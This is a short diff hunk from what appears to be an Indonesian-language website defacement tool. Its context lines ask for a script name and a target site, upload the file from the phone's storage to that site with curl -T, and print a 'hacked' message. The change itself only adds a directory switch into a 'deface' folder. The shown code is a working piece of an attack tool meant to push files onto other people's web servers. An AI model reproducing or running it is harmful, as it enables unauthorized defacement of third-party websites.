@@ -59,6 +59,7 @@ read -p "[?] Masukan Nama Script => " sc;
 read -p "[?] Masukan Web Target => " T;
 curl -T /sdcard/$sc $T
 echo "[!] Terhack => " $T/$sc | lolcat
+cd deface
 ;;
 3) sh A.sh
 ;;
